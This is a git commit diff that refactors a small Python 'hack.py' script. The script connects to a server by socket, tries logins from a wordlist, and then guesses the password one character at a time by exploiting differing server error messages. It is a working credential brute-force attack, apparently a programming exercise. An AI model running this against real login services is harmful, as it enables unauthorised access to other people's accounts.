06eab065e5e07eb17ca7e37a4270f995dff63dc4
Georgij Kocsarjan <georgij.kocsarjan@gmail.com>
2024-02-18 16:59:45 +0100

    Optimize code

--- hack.py
+++ hack.py
@@ -1,13 +1,13 @@
 import json
+import socket
 import utilities
-import itertools
 
 chunk_size = 1024
 args = utilities.return_args()
 ip_address = args.ip_address
 port = int(args.port)
-with utilities.create_socket(ip_address, port) as client_socket:
-    correct_login = utilities.find_login(client_socket, chunk_size)
-    correct_dict = utilities.find_password(client_socket, chunk_size, correct_login)
-print(json.dumps(correct_dict))
+with socket.socket() as client_socket:
+    client_socket.connect((ip_address, port))
+    correct_login = utilities.find_login(client_socket, chunk_size, 'logins.txt')
+print(json.dumps(correct_login))
 
--- utilities.py
+++ utilities.py
@@ -1,9 +1,8 @@
 import argparse
-import socket
 import json
 import string
 
-all_chars = string.ascii_letters + string.digits + string.punctuation
+char_list = list(string.ascii_letters + string.digits + string.punctuation)
 
 
 def return_args():
@@ -14,49 +13,14 @@ def return_args():
     return args
 
 
-def create_socket(ip, port):
-    client_socket = socket.socket()
-    client_socket.connect((ip, port))
-    return client_socket
-
-
-def read_file(path):
+def find_login(client_socket, chunk_size, path):
     with open(path, 'r') as file:
-        for row in file:
-            yield row
-
-
-def find_login(client_socket, chunk_size):
-        for login in read_file('logins.txt'):
+        for login in file:
             login = login.strip('\n')
             json_login = {'login': login, 'password': ''}
-            message = json.dumps(json_login, indent=4)
-            try:
-                client_socket.send(message.encode('utf-8'))
-                response = client_socket.recv(chunk_size).decode('utf-8')
-            except:
-                pass
-            returned_str = json.loads(response)
-            if returned_str['result'] == 'Wrong password!':
-                return json_login['login']
-
-
-
-def find_password(client_socket, chunk_size,  correct_login):
-    char_list = list(all_chars)
-    for single_char in char_list:
-        json_login = {'login': correct_login, 'password': single_char}
-        message = json.dumps(json_login, indent=4)
-        try:
-            client_socket.send(message.encode('utf-8'))
-            response = client_socket.recv(chunk_size).decode('utf-8')
-        except:
-            pass
-        returned_str = json.loads(response)
-        if returned_str['result'] == 'Exception happened during login':
-            guessed_password = json_login['password']
+            guessed_password: str = ''
             char_index = 0
-            while response != 'Connection success!':
+            while True:
                 password = guessed_password
                 password += char_list[char_index]
                 char_index += 1
@@ -68,10 +32,10 @@ def find_password(client_socket, chunk_size,  correct_login):
                 except:
                     pass
                 returned_str = json.loads(response)
-                if returned_str['result'] == 'Exception happened during login':
+                if returned_str['result'] == 'Wrong login!':
+                    break
+                elif returned_str['result'] == 'Exception happened during login':
                     guessed_password = password
                     char_index = 0
                 elif returned_str['result'] == 'Connection success!':
                     return json_login
-                    break
-    return json_login
